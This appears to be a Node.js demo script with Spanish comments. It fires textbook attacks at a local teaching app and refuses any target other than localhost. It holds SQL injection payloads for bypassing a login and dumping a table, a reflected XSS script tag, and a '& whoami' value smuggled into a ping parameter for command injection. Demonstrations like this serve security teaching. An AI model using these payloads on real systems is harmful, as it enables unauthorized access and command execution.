// Demostración controlada de los ataques contra http://127.0.0.1:3000
// Uso:  1) en una ventana:  npm start
//       2) en otra ventana: npm run ataques
// Se hace con Node (y no con curl) para evitar los problemas de comillas de PowerShell.
const BASE = process.env.BASE_URL || "http://127.0.0.1:3000";
if (!/^http:\/\/(127\.0\.0\.1|localhost)(:\d+)?$/.test(BASE)) {
  console.error("Por seguridad este script solo ataca localhost.");
  process.exit(1);
}

async function mostrar(titulo, url, opciones) {
  console.log("\n==================================================");
  console.log(titulo);
  console.log((opciones && opciones.method) || "GET", url);
  if (opciones && opciones.body) console.log("Cuerpo:", opciones.body);
  try {
    const r = await fetch(BASE + url, opciones);
    console.log("Estado HTTP:", r.status);
    console.log("Respuesta:\n" + (await r.text()).trim());
  } catch (e) {
    console.log("No se pudo conectar. ¿Iniciaste la app con 'npm start'?", e.message);
  }
}

const json = (cuerpo) => ({
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify(cuerpo),
});

(async () => {
  await mostrar("0) Uso normal: login de ana", "/login", json({ username: "ana", password: "Ana#2026" }));
  await mostrar("1) SQLi: entrar como admin SIN contraseña", "/login", json({ username: "admin'--", password: "x" }));
  await mostrar("1b) SQLi: volcar toda la tabla", "/users?name=" + encodeURIComponent("' OR '1'='1"));
  await mostrar("2) XSS reflejado", "/search?q=" + encodeURIComponent("<script>alert('XSS')</script>"));
  await mostrar("3) Inyección de comandos (ejecuta whoami)", "/ping?host=" + encodeURIComponent("127.0.0.1 & whoami"));
})();
